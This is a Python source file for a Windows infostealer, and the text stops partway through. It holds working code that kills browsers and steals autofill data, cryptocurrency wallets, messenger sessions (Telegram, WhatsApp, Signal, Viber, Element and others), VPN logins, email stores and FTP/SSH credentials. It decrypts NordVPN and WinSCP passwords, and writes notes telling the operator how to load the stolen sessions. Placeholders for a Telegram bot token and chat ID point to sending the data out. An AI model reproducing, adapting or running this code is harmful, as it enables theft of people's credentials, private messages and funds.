import ctypes
from datetime import datetime
import json
import asyncio
import base64
import re
import sys
import time
import winreg
import win32con # type: ignore
import aiohttp # type: ignore
import os
import shutil
import sqlite3
import requests
import platform
import psutil # type: ignore
import win32api # type: ignore

from pathlib import Path
import xml.etree.ElementTree as ET
from ctypes import *
import winreg as reg
from urllib.request import urlopen
from json import loads
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes # type: ignore
from cryptography.hazmat.backends import default_backend # type: ignore


TOKEN = '%token%'
CHAT_ID = '%chatid%'


def error_handler(error_message: str) -> None:
    hostname = platform.node()
    temp_dir = os.path.join(os.getenv('TEMP'), hostname)

    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)

    exc_message = error_message
    error_file_path = os.path.join(temp_dir, 'errors.txt')

    with open(error_file_path, 'a') as file:
        file.write(f"Message : {exc_message}\n\n")
        
class ListFonction:
    Autofills = list()

    ClipBoard = list()
    Network = list()
    InstalledSoftware = list()
    Processes = list()
    TasksList = list()
    SystemInfo = list()

    SteamUserAccounts = list()

class get_data:
    def __init__(self):
        self.profiles_full_path = []
        self.appdata = os.getenv('APPDATA')
        self.localappdata = os.getenv('LOCALAPPDATA')
        self.temp = os.getenv('TEMP')

    async def RunAllFonctions(self):
        await self.kill_browsers()
        await self.list_profiles()
        taskk = [
            asyncio.create_task(self.GetAutoFills()),
            asyncio.create_task(self.StealSteamUser()),
            InfoStealer().run_all_fonctions(),
            ]
        await asyncio.gather(*taskk)
        await self.InsideFolder()
        await self.SendAllData()
    async def list_profiles(self) -> None:
        try:
            directorys = {
                "Brave": os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
                "Chrome": os.path.join(self.localappdata, "Google", "Chrome", "User Data"),
                "Chromium": os.path.join(self.localappdata, "Chromium", "User Data"),
                "Edge": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data"),
                "EpicPrivacy": os.path.join(self.localappdata, "Epic Privacy Browser", "User Data"),
                "Iridium": os.path.join(self.localappdata, "Iridium", "User Data"),
                "Opera": os.path.join(self.appdata, "Opera Software", "Opera Stable"),
                "OperaGX": os.path.join(self.appdata, "Opera Software", "Opera GX Stable"),
                "Vivaldi": os.path.join(self.localappdata, "Vivaldi", "User Data"),
                "Yandex": os.path.join(self.localappdata, "Yandex", "YandexBrowser", "User Data")
            }
            for name, directory in directorys.items():
                if os.path.isdir(directory):
                    if "Opera" in name:
                        self.profiles_full_path.append(directory)
                    else:
                        self.profiles_full_path.extend(os.path.join(root, folder) for root, folders, _ in os.walk(directory) for folder in folders if folder == 'Default' or folder.startswith('Profile') or "Guest Profile" in folder)

        except Exception as e:
            error_handler(f"list profiles error - {str(e)}")
            pass

    async def kill_browsers(self):
        try:
            process_names = ["chrome.exe", "opera.exe", "edge.exe", "firefox.exe", "brave.exe", "browser.exe", "vivaldi.exe", "iridium.exe", "epicprivacy.exe", "chromium.exe"]
            process = await asyncio.create_subprocess_shell('tasklist',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)

            stdout, stderr = await process.communicate()
            if not process.returncode != 0:
                output_lines = stdout.decode(errors="ignore").split('\n')
                for line in output_lines:
                    for process_name in process_names:
                        if process_name.lower() in line.lower():
                            parts = line.split()
                            pid = parts[1]
                            process = await asyncio.create_subprocess_shell(f'taskkill /F /PID {pid}',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)
                            await process.communicate()
        except Exception as e:
            error_handler(f"kill browser error - {str(e)}")
            pass

    async def GetAutoFills(self) -> None:
        try:
            for path in self.profiles_full_path:
                autofill_data = os.path.join(path, "Web Data")
                copied_file_path = os.path.join(self.Temp, "AutofillData.db")                
                shutil.copyfile(autofill_data, copied_file_path)
                with sqlite3.connect(copied_file_path) as database_connection:
                    cursor = database_connection.cursor()
                    cursor.execute('SELECT * FROM autofill')
                    autofills = cursor.fetchall()
                for autofill in autofills:
                    if autofill:
                        ListFonction.Autofills.append(f"data: {autofill[0]}\nvalue: {autofill[1]}\n==============================\n")
                try:
                    cursor.close()
                    os.remove(copied_file_path)
                except:pass  
        except Exception as e:
            error_handler(f"get autofills error - {str(e)}")

    async def StealWallets(self, copied_path:str) -> None:
        try:
            wallets_ext_names = {
                "Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
                "Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
                "Authy": "gaedmjdfmmahhbjefcbgaolhhanlaolb",
                "EOSAuthenticator": "oeljdldpnmdbchonielidgobddffflal",
                "GAuthAuthenticator": "ilgcnhelpchnceeipipijaljkblbcobl",
                "TON": "nphplpgoakhhjchkkhmiggakijnkhfnd",
                "Ronin": "fnjhmkhhmkbjkkabndcnnogagogbneec",
                "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
                "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
                "MetaMask_Edge": "ejbalbakoplchlghecdalmeeeajnimhm",
                "Exodus": "aholpfdialjgjfhomihkjbmgjidlcdno",
                "TrustWallet": "egjidjbpglichdcondbcbdnbeeppgdph",
                "Metamask (Opera)": "djclckkglechooblngghdinmeemkbgci",
                "Ronin": "bblmcdckkhkhfhhpfcchlpalebmonecp",
                }
            wallet_local_paths = {
                "Bitcoin": os.path.join(self.appdata, "Bitcoin", "wallets"),
                "Bytecoin": os.path.join(self.appdata, "bytecoin"),
                "Coinomi": os.path.join(self.localappdata, "Coinomi", "Coinomi", "wallets"),
                "Atomic": os.path.join(self.appdata, "Atomic", "Local Storage", "leveldb"),
                "Dash": os.path.join(self.appdata, "DashCore", "wallets"),
                "Exodus": os.path.join(self.appdata, "Exodus", "exodus.wallet"),
                "Electrum": os.path.join(self.appdata, "Electrum", "wallets"),
                "WalletWasabi": os.path.join(self.appdata, "WalletWasabi", "Client", "Wallets"),
            }
            wallet_dir = os.path.join(copied_path, "Wallets")
            os.makedirs(wallet_dir, exist_ok=True)

            for path in self.profiles_full_path:
                ext_path = os.path.join(path, "Local Extension Settings")
                if os.path.exists(ext_path):
                    for wallet_name, wallet_addr in wallets_ext_names.items():
                        wallet_path = os.path.join(ext_path, wallet_addr)
                        if os.path.isdir(wallet_path):
                            try:
                                file_name = f"{os.path.basename(ext_path)} {wallet_name}"
                                dest_path = os.path.join(wallet_dir, file_name)
                                shutil.copytree(wallet_path, dest_path)
                            except Exception:
                                error_handler(f"wallet extension error - {str(e)}")


            for wallet_name, wallet_path in wallet_local_paths.items():
                try:
                    if os.path.exists(wallet_path):
                        dest_path = os.path.join(wallet_dir, wallet_name)
                        shutil.copytree(wallet_path, dest_path)
                except Exception as e:
                    error_handler(f"wallet dekstop error - {str(e)}")

        except Exception as e:
            error_handler(f"wallets error - {str(e)}")

    async def StealTelegramSession(self, directory_path: str) -> None:
        try:
            tg_path = os.path.join(self.appdata, "Telegram Desktop", "tdata")
            
            if os.path.exists(tg_path):
                copy_path = os.path.join(directory_path, "Messenger", "Telegram Session")
                black_listed_dirs = ["dumps", "emojis", "user_data", "working", "emoji", "tdummy", "user_data#2", "user_data#3", "user_data#4", "user_data#5"]

                processes = await asyncio.create_subprocess_shell(f"taskkill /F /IM Telegram.exe", shell=True, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                await processes.communicate()

                if not os.path.exists(copy_path):
                    os.makedirs(copy_path)

                for dirs in os.listdir(tg_path):
                    try:
                        _path = os.path.join(tg_path, dirs)
                        if not dirs in black_listed_dirs:
                            if os.path.isfile(_path):
                                shutil.copyfile(_path, os.path.join(copy_path, dirs))
                            elif os.path.isdir(_path):
                                shutil.copytree(_path, os.path.join(copy_path, dirs))
                    except Exception as e:
                        error_handler(f"copy telegram folders error - {str(e)}")
                        continue

                if len(os.listdir(copy_path)) == 0:
                    os.rmdir(copy_path)

        except Exception as e:
            error_handler(f"telegram error - {str(e)}")
            pass


    async def StealWhatsApp(self, directory_path: str) -> None:
        try:
            whatsapp_session = os.path.join(directory_path, "Messenger", "WhatsApp")
            os.makedirs(whatsapp_session, exist_ok=True)
            regex_pattern = re.compile(r"^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$", re.IGNORECASE)
            parent_folders = [entry for entry in Path(self.localappdata, 'Packages').iterdir() if regex_pattern.match(entry.name)]

            for parent in parent_folders:
                local_state_folders = [entry for entry in parent.rglob("LocalState") if entry.is_dir()]
                for local_state_folder in local_state_folders:
                    profile_pictures_folders = [entry for entry in local_state_folder.rglob("profilePictures") if entry.is_dir()]
                    for profile_folder in profile_pictures_folders:
                        destination_path = os.path.join(whatsapp_session, local_state_folder.name, "profilePictures")
                        os.makedirs(destination_path, exist_ok=True)
                        shutil.copytree(profile_folder, destination_path, dirs_exist_ok=True)

                    files_to_copy = [file for file in local_state_folder.rglob("*") if file.is_file() and file.stat().st_size <= 10 * 1024 * 1024 and re.search(r"\.db$|\.db-wal$|\.dat$", file.name)]
                    for file in files_to_copy:
                        dest_folder = os.path.join(whatsapp_session, local_state_folder.name)
                        os.makedirs(dest_folder, exist_ok=True)
                        shutil.copy(file, dest_folder)
                        
        except Exception as e:
            error_handler(f"whatsapp error - {str(e)}")
            pass

    async def StealSkype(self, directory_path: str) -> None:
        try:
            skype_folder = os.path.join(self.appdata, "Microsoft", "Skype for Desktop", "Local Storage", "leveldb")
            if os.path.exists(skype_folder):
                copy_path = os.path.join(directory_path, "Messenger", "Skype")
                os.makedirs(copy_path, exist_ok=True)
                if os.path.isdir(skype_folder):shutil.copytree(skype_folder, copy_path, dirs_exist_ok=True)
                else:shutil.copyfile(skype_folder, copy_path)
                
                if len(os.listdir(copy_path)) == 0:
                    os.rmdir(copy_path)
                
        except Exception as e:
            error_handler(f"skype error - {str(e)}")
            pass

    async def StealSignal(self, directory_path: str) -> None:
        try:
            signal_path = os.path.join(self.appdata, 'Signal')
            copied_path = os.path.join(directory_path, "Messenger", "Signal")
            if os.path.isdir(signal_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                try:
                    if os.path.exists(Path(signal_path) / "sql"):
                        shutil.copytree(Path(signal_path) / "sql", os.path.join(copied_path, "sql"))
                    if os.path.exists(Path(signal_path) / "attachments.noindex"):
                        shutil.copytree(Path(signal_path) / "attachments.noindex", os.path.join(copied_path, "attachments.noindex"))
                    if os.path.exists(Path(signal_path) / "config.json"):
                        shutil.copy(Path(signal_path) / "config.json", copied_path)
                except Exception as e:
                    error_handler(f"copy signal files error - {str(e)}")
                    pass
                if len(os.listdir(copied_path)) == 0:
                    os.rmdir(copied_path)

        except Exception as e:
            error_handler(f"signal error - {str(e)}")
            pass
 
    async def StealElement(self, directory_path: str) -> None:
        try:
            found_element = False
            element_path = os.path.join(self.appdata, 'Element')
            copied_path = os.path.join(directory_path, "Messenger", "Element")
            if os.path.isdir(element_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                indexed_db_src = Path(element_path) / "IndexedDB"
                local_storage_src = Path(element_path) / "Local Storage"
                try:
                    if os.path.exists(indexed_db_src):
                        shutil.copytree(indexed_db_src, os.path.join(copied_path, "IndexedDB"))
                    if os.path.exists(local_storage_src):
                        shutil.copytree(local_storage_src, os.path.join(copied_path, "Local Storage"))
                    found_element = True
                except Exception as e:
                    error_handler(f"copy element files error - {str(e)}")
                    pass
                if found_element:
                    os.mkdir(os.path.join(copied_path, "How to Use"))
                    with open(os.path.join(copied_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                        write_file.write("First, open this file path on your computer <%appdata%\\Element>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run Element")
                if len(os.listdir(copied_path)) == 0:
                    os.rmdir(copied_path)
        except Exception as e:
            error_handler(f"element error - {str(e)}")
            pass 
   
    async def StealViber(self, directory_path: str) -> None:
        try:
            found_viber = False
            viber_path = os.path.join(self.appdata, 'ViberPC')
            copied_path = os.path.join(directory_path, "Messenger", "Viber")
            if os.path.isdir(viber_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                pattern = re.compile(r"^(\+?[0-9]{1,12})$")
                directories = [entry for entry in Path(viber_path).iterdir() if entry.is_dir() and pattern.match(entry.name)]
                root_files = [file for file in Path(viber_path).glob("*.db")]

                for root_file in root_files:
                    shutil.copy(root_file, copied_path)

                for directory in directories:
                    destination_path = os.path.join(copied_path, directory.name)
                    shutil.copytree(directory, destination_path)
                    files = [file for file in directory.rglob("*") if file.is_file() and re.search(r"\.db$|\.db-wal$", file.name)]
                    for file in files:
                        dest_file_path = os.path.join(destination_path, file.name)
                        shutil.copy(file, dest_file_path)
                    found_viber = True
                if found_viber:
                    os.mkdir(os.path.join(copied_path, "How to Use"))
                    with open(os.path.join(copied_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                        write_file.write("First, open this file path on your computer <%appdata%\\ViberPC>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run Viber")
                if len(os.listdir(copied_path)) == 0:
                    os.rmdir(copied_path)
        except Exception as e:
            error_handler(f"viber error - {str(e)}")
            pass
  

    async def StealPidgin(self, directory_path: str) -> None:
        try:
            pidgin_folder = os.path.join(self.appdata, '.purple', "accounts.xml")
            if os.path.exists(pidgin_folder):
                pidgin_accounts = os.path.join(directory_path, "Messenger", "Pidgin")
                os.makedirs(pidgin_accounts, exist_ok=True)
                if pidgin_folder.is_dir():
                    shutil.copytree(pidgin_folder, pidgin_accounts, dirs_exist_ok=True)
                else:
                    shutil.copy2(pidgin_folder, pidgin_accounts)
                if len(os.listdir(pidgin_accounts)) == 0:
                    os.rmdir(pidgin_accounts)
        except Exception as e:
            error_handler(f"pidgin error - {str(e)}")
            pass

    async def StealTox(self, directory_path: str) -> None:
        try:
            tox_folder = os.path.join(self.appdata, 'Tox')
            if os.path.isdir(tox_folder):
                tox_session = os.path.join(directory_path, "Messenger", "Tox")
                os.makedirs(tox_session, exist_ok=True)
                for item in Path(tox_folder).iterdir():
                    if item.is_dir():
                        shutil.copytree(item, tox_session, dirs_exist_ok=True)
                    else:
                        shutil.copy2(item, tox_session)
                if len(os.listdir(tox_session)) == 0:
                    os.rmdir(tox_session)
        except Exception as e:
            error_handler(f"tox error - {str(e)}")
            pass

    async def StealProtonVPN(self, directory_path: str) -> None:
        try:
            protonvpn_folder = os.path.join(self.localappdata, 'ProtonVPN')
            if not os.path.isdir(protonvpn_folder):
                return
            
            async def get_hierarchy(root_dir, pattern):
                return [entry for entry in root_dir.iterdir() if entry.is_dir() and re.match(pattern, entry.name)]
            protonvpn_account = os.path.join(directory_path, "VPN", 'ProtonVPN')
            os.makedirs(protonvpn_account, exist_ok=True)
            pattern = re.compile(r"^ProtonVPN_Url_[A-Za-z0-9]+$")
            directories = await get_hierarchy(Path(protonvpn_folder), pattern)
            for directory in directories:
                destination_path = os.path.join(protonvpn_account, directory.name)
                if directory.is_dir():
                    shutil.copytree(directory, destination_path, dirs_exist_ok=True)
                else:
                    shutil.copy2(directory, destination_path)
        except Exception as e:
            error_handler(f"proton error - {str(e)}")
            pass

    async def StealSurfsharkVPN(self, directory_path: str) -> None:
        try:
            surfsharkvpn_folder = os.path.join(self.appdata, 'Surfshark')
            if not os.path.isdir(surfsharkvpn_folder):
                return
            
            surfsharkvpn_account = os.path.join(directory_path, "VPN", 'Surfshark')
            os.makedirs(surfsharkvpn_account, exist_ok=True)
            files_to_copy = ["data.dat", "settings.dat", "settings-log.dat", "private_settings.dat"]
            for root, _, files in os.walk(surfsharkvpn_folder):
                for file in files:
                    if file in files_to_copy:
                        shutil.copy2(os.path.join(root, file), surfsharkvpn_account)
        except Exception as e:
            error_handler(f"surfshark error - {str(e)}")
            pass

    async def StealOpenVPN(self, directory_path: str) -> None:
        try:
            openvpn_folder = os.path.join(self.appdata, 'OpenVPN Connect')
            if not os.path.isdir(openvpn_folder):
                return
            
            openvpn_accounts = os.path.join(directory_path, "VPN", 'OpenVPN')
            os.makedirs(openvpn_accounts, exist_ok=True)
            profiles_src = os.path.join(openvpn_folder, 'profiles')
            config_src = os.path.join(openvpn_folder, 'config.json')

            if Path(profiles_src).is_dir():
                shutil.copytree(Path(profiles_src), openvpn_accounts, dirs_exist_ok=True)
            else:
                shutil.copy2(Path(profiles_src), openvpn_accounts)

            if Path(config_src).is_dir():
                shutil.copytree(Path(config_src), openvpn_accounts, dirs_exist_ok=True)
            else:
                shutil.copy2(Path(config_src), openvpn_accounts)
        except Exception as e:
            error_handler(f"openvpn error - {str(e)}")
            pass

    async def DecryptNordVPN(self, encrypted) -> None:
        try:
            encrypted_data = base64.b64decode(encrypted)
            return WindowsApi.CryptUnprotectData(encrypted_data).decode('utf-8')
        except Exception as e:
            error_handler(f"decrypt nordvpn error - {str(e)}")
            return ""

    async def StealNordVPN(self, driectory_path):
        vpn_path = os.path.join(self.appdata, "NordVPN")

        if not os.path.exists(vpn_path):
            return

        try:

            for root, dirs, files in os.walk(vpn_path):
                for directory in dirs:
                    user_config_path = os.path.join(root, directory, "user.config")
                    if not os.path.exists(user_config_path):
                        continue

                    vpn_version_path = os.path.join(driectory_path, "VPN", "NordVPN", directory)
                    os.makedirs(vpn_version_path, exist_ok=True)

                    tree = ET.parse(user_config_path)
                    root_xml = tree.getroot()

                    encoded_username = root_xml.find(".//setting[@name='Username']/value").text
                    encoded_password = root_xml.find(".//setting[@name='Password']/value").text

                    if not encoded_username or not encoded_password:
                        continue

                    username = await self.DecryptNordVPN(encoded_username)
                    password = await self.DecryptNordVPN(encoded_password)

                    with open(os.path.join(vpn_version_path, "nordvpn_account.txt"), "a") as file:
                        file.write(f"Username: {username}\nPassword: {password}\n\n")
        except Exception as e:
            error_handler(f"nordvpn error - {str(e)}")
            pass

    async def BackupThunderbird(self, directory_path: str) -> None:
        try:
            thunderbird_folder = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Thunderbird', 'Profiles')
            if not os.path.isdir(thunderbird_folder):
                return
            
            thunderbird_backup = os.path.join(directory_path, "Email", 'Thunderbird')
            os.makedirs(thunderbird_backup, exist_ok=True)
            pattern = re.compile(r"^[a-z0-9]+\.default-esr$")
            async def get_hierarchy(root_dir, pattern):
                return [entry for entry in root_dir.iterdir() if entry.is_dir() and re.match(pattern, entry.name)]
            directories = await get_hierarchy(Path(thunderbird_folder), pattern)
            filter_files = ["key4.db", "key3.db", "logins.json", "cert9.db", "*.js"]
            for directory in directories:
                destination_path = os.path.join(thunderbird_backup, directory.name)
                os.makedirs(destination_path, exist_ok=True)
                for file_pattern in filter_files:
                    for file in directory.rglob(file_pattern):
                        relative_path = file.relative_to(directory)
                        dest_file_path = os.path.join(destination_path, relative_path)
                        dest_file_dir = os.path.dirname(dest_file_path)
                        if not os.path.isdir(dest_file_dir):
                            os.makedirs(dest_file_dir, exist_ok=True)
            
                        if file.is_dir():
                            shutil.copytree(file, dest_file_path, dirs_exist_ok=True)
                        else:
                            shutil.copy2(file, dest_file_path)
        except Exception as e:
            error_handler(f"backupthunderbird error - {str(e)}")
            pass


    async def BackupMailbird(self, directory_path: str) -> None:
        try:
            mailbird_folder = os.path.join(self.localappdata, 'MailBird')
            if not os.path.isdir(mailbird_folder):
                return
            
            mailbird_db = os.path.join(directory_path, "Email", 'MailBird')
            os.makedirs(mailbird_db, exist_ok=True)
            store_db = os.path.join(mailbird_folder, 'Store', 'Store.db')
            if Path(store_db).is_dir():
                shutil.copytree(Path(store_db), mailbird_db, dirs_exist_ok=True)
            else:
                shutil.copy2(Path(store_db), mailbird_db)
    
        except Exception as e:
            error_handler(f"backupmailbird error - {str(e)}")
            pass

    # async def DecryptOutlook(encrypted_value) -> None:
    #     try:
    #         encrypted_data = encrypted_value[1:]
    #         blob_in = ctypes.windll.kernel32.LocalAlloc(0x40, len(encrypted_data))
    #         ctypes.windll.kernel32.RtlMoveMemory(blob_in, bytes(encrypted_data), len(encrypted_data))

    #         data_out = ctypes.c_void_p()
    #         if ctypes.windll.crypt32.CryptUnprotectData(
    #             ctypes.byref(ctypes.c_buffer(encrypted_data)), None, None, None, None, 0, ctypes.byref(data_out)):
    #             decrypted_data = ctypes.cast(data_out, ctypes.POINTER(ctypes.c_ubyte))
    #             length = ctypes.windll.kernel32.LocalSize(data_out)
    #             return bytes(bytearray([decrypted_data[i] for i in range(length)])).decode("utf-8").replace("\x00", "")
    #     except Exception as e:
    #         error_handler(f"decrypt outlook error - {str(e)}")
    #         return "null"

    # async def get_info_from_registry(self, path, value_name) -> None:
    #     try:
    #         registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_READ)
    #         value, regtype = reg.QueryValueEx(registry_key, value_name)
    #         reg.CloseKey(registry_key)
    #         return value
    #     except Exception as e:
    #         error_handler(f"get info from registry error - {str(e)}")
    #         return None

    # async def StealOutlook(self, directory_path) -> None:
    #     mail_client_regex = re.compile(r'^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$')
    #     smtp_client_regex = re.compile(r'^(?!:\/\/)([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}?$')

    #     outlook_path = os.path.join(directory_path, "Email", 'OutlookMail')

    #     reg_directories = [
    #         r"Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
    #         r"Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
    #         r"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
    #         r"Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676"
    #     ]

    #     mail_clients = [
    #         "SMTP Email Address", "SMTP Server", "POP3 Server", "POP3 User Name", "SMTP User Name", "NNTP Email Address",
    #         "NNTP User Name", "NNTP Server", "IMAP Server", "IMAP User Name", "Email", "HTTP User", "HTTP Server URL",
    #         "POP3 User", "IMAP User", "HTTPMail User Name", "HTTPMail Server", "SMTP User", "POP3 Password2",
    #         "IMAP Password2", "NNTP Password2", "HTTPMail Password2", "SMTP Password2", "POP3 Password", "IMAP Password",
    #         "NNTP Password", "HTTPMail Password", "SMTP Password",
    #     ]

    #     data = ""
    #     for directory in reg_directories:
    #         data += await self.get_data_from_registry(directory, mail_clients, mail_client_regex, smtp_client_regex)

    #     if data:
    #         os.makedirs(outlook_path, exist_ok=True)
    #         with open(os.path.join(outlook_path, "Outlook.txt"), "w") as file:
    #             file.write(data + "\r\n")

    # async def get_data_from_registry(self, path, clients, mail_client_regex, smtp_client_regex) -> None:
    #     data = ""
    #     try:
    #         for client in clients:
    #             try:
    #                 value = await self.get_info_from_registry(path, client)
    #                 if value and "Password" in client and "2" not in client:
    #                     data += f"{client}: {await self.DecryptOutlook(value)}\r\n"
    #                 elif value and (smtp_client_regex.match(value) or mail_client_regex.match(value)):
    #                     data += f"{client}: {value}\r\n"
    #                 elif value:
    #                     decoded_value = value.decode("utf-8").replace("\x00", "")
    #                     data += f"{client}: {decoded_value}\r\n"
    #             except Exception as e:
    #                 error_handler(f"get data from reg error - {str(e)}")
    #                 pass

    #         with reg.OpenKey(reg.HKEY_CURRENT_USER, path) as key:
    #             subkeys_count = reg.QueryInfoKey(key)[0]
    #             for i in range(subkeys_count):
    #                 subkey_name = reg.EnumKey(key, i)
    #                 data += await self.get_data_from_registry(f"{path}\\{subkey_name}", clients, mail_client_regex, smtp_client_regex)

    #     except Exception as e:
    #         error_handler(f"get data from registry error - {str(e)}")
    #         pass

    #     return data

    async def StealFileZilla(self, directory_path: str) -> None:
        try:
            filezilla_folder = os.path.join(self.appdata, 'FileZilla')
            if not os.path.isdir(filezilla_folder):
                return
            
            filezilla_hosts = os.path.join(directory_path, "FTP Clients", 'FileZilla')
            os.makedirs(filezilla_hosts, exist_ok=True)
            recent_servers_xml = os.path.join(filezilla_folder, 'recentservers.xml')
            site_manager_xml = os.path.join(filezilla_folder, 'sitemanager.xml')

            def parse_server_info(xml_content):
                host_match = re.search(r"<Host>(.*?)</Host>", xml_content)
                port_match = re.search(r"<Port>(.*?)</Port>", xml_content)
                user_match = re.search(r"<User>(.*?)</User>", xml_content)
                pass_match = re.search(r"<Pass encoding=\"base64\">(.*?)</Pass>", xml_content)

                server_host = host_match.group(1) if host_match else ""
                server_port = port_match.group(1) if port_match else ""
                server_user = user_match.group(1) if user_match else ""
                if not server_user:
                    return f"Host: {server_host}\nPort: {server_port}\n"
                encoded_pass = pass_match.group(1) if pass_match else ""
                decoded_pass = (encoded_pass and 
                                base64.b64decode(encoded_pass).decode('utf-8') if encoded_pass else "")
                return f"Host: {server_host}\nPort: {server_port}\nUser: {server_user}\nPass: {decoded_pass}\n"

            servers_info = []
            for xml_file in [recent_servers_xml, site_manager_xml]:
                if os.path.isfile(xml_file):
                    with open(xml_file, 'r') as file:
                        xml_content = file.read()
                        server_entries = re.findall(r"<Server>(.*?)</Server>", xml_content, re.DOTALL)
                        for server_entry in server_entries:
                            servers_info.append(parse_server_info(server_entry))

            with open(os.path.join(filezilla_hosts, 'Hosts.txt'), 'w') as file:
                file.write("\n".join(servers_info))
                
            if len(os.listdir(filezilla_hosts)) == 0:
                os.rmdir(filezilla_hosts)
        except Exception as e:
            error_handler(f"filezilla error - {str(e)}")
            pass


    async def StealWinSCP(self, directory_path: str) -> None:
        try:
            registry_path = r"SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
            winscp_session = os.path.join(directory_path, "FTP Clients", 'WinSCP')
            os.makedirs(winscp_session, exist_ok=True)
            output_path = os.path.join(winscp_session, 'WinSCP-sessions.txt')
            output = "WinSCP Sessions\n\n"
            
            def decrypt_winscp_password(hostname, username, password):
                check_flag = 255
                magic = 163
                key = hostname + username
                remaining_pass = password
                flag_and_pass = decrypt_next_character_winscp(remaining_pass)
                stored_flag = flag_and_pass['flag']
                if stored_flag == check_flag:
                    remaining_pass = remaining_pass[2:]
                    flag_and_pass = decrypt_next_character_winscp(remaining_pass)
                length = flag_and_pass['flag']
                remaining_pass = remaining_pass[(flag_and_pass['flag'] * 2):]
                final_output = ""
                for _ in range(length):
                    flag_and_pass = decrypt_next_character_winscp(remaining_pass)
                    final_output += chr(flag_and_pass['flag'])
                if stored_flag == check_flag:
                    return final_output[len(key):]
                return final_output

            def decrypt_next_character_winscp(remaining_pass):
                magic = 163
                firstval = "0123456789ABCDEF".index(remaining_pass[0]) * 16
                secondval = "0123456789ABCDEF".index(remaining_pass[1])
                added = firstval + secondval
                decrypted_result = ((~(added ^ magic)) + 256) % 256
                return {'flag': decrypted_result, 'remaining_pass': remaining_pass[2:]}

            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path) as reg_key:
                    index = 0
                    while True:
                        try:
                            session_name = winreg.EnumKey(reg_key, index)
                            session_path = f"{registry_path}\\{session_name}"
                            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, session_path) as session_key:
                                hostname = winreg.QueryValueEx(session_key, 'HostName')[0]
                                username = winreg.QueryValueEx(session_key, 'UserName')[0]
                                encrypted_password = winreg.QueryValueEx(session_key, 'Password')[0]
                                password = decrypt_winscp_password(hostname, username, encrypted_password)
                                output += f"Session  : {session_name}\nHostname : {hostname}\nUsername : {username}\nPassword : {password}\n\n"
                        except OSError:
                            break
                        index += 1
            except OSError as e:
                error_handler(f"os error winscp error - {str(e)}")

            with open(output_path, 'w') as file:
                file.write(output)

        except OSError:
            error_handler(f"all os error winscp - {str(e)}")
        except Exception as e:
            error_handler(f"winscp error - {str(e)}")


    async def StealPutty(self, directory_path: str) -> None:
        try:
            database_path = self.get_default_database()
        except Exception as e:
            error_handler(f"get default database putty error - {str(e)}")
            return

        full_path = os.path.join(directory_path, "FTP Clients", "Putty", database_path)
        
        if os.path.exists(full_path):
            pwd_found = await self.parse_xml(full_path)
            await self.save_to_file(pwd_found, directory_path)
        else:
            pass

    def get_default_database(self) -> str:
        access_read = win32con.KEY_READ | win32con.KEY_ENUMERATE_SUB_KEYS | win32con.KEY_QUERY_VALUE
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, 'Software\\ACS\\PuTTY Connection Manager', 0, access_read)
        this_name, _ = win32api.RegQueryValueEx(key, 'DefaultDatabase')
        return str(this_name) if this_name else ' '

    async def parse_xml(self, xml_file: str) -> list:
        try:
            tree = ET.parse(xml_file)
            root = tree.getroot()
            pwd_found = []

            for connection in root.findall('connection'):
                values = {}
                for child in connection:
                    if child.tag in ['name', 'protocol', 'host', 'port', 'description', 'login', 'password']:
                        values[child.tag] = child.text

                if values:
                    pwd_found.append(values)

            return pwd_found
        except ET.ParseError as e:
            error_handler(f"putty parse xml error - {str(e)}")
            return []

    async def save_to_file(self, data: list, directory_path: str) -> None:
        output_file = os.path.join(directory_path, "FTP Clients", "Putty", 'putty_connections.txt')
        try:
            with open(output_file, 'w') as file:
                for entry in data:
                    for key, value in entry.items():
                        file.write(f"{key}: {value}\n")
                    file.write("\n")
        except IOError as e:
            error_handler(f"ioerror putty save to file - {str(e)}")
            pass

    async def StealPasswordManagers(self, directory_path: str) -> None:
        try:
            browser_paths = {
                "Brave": os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
                "Chrome": os.path.join(self.localappdata, "Google", "Chrome", "User Data"),
                "Chromium": os.path.join(self.localappdata, "Chromium", "User Data"),
                "Edge": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data"),
                "EpicPrivacy": os.path.join(self.localappdata, "Epic Privacy Browser", "User Data"),
                "Iridium": os.path.join(self.localappdata, "Iridium", "User Data"),
                "Opera": os.path.join(self.appdata, "Opera Software", "Opera Stable"),
                "OperaGX": os.path.join(self.appdata, "Opera Software", "Opera GX Stable"),
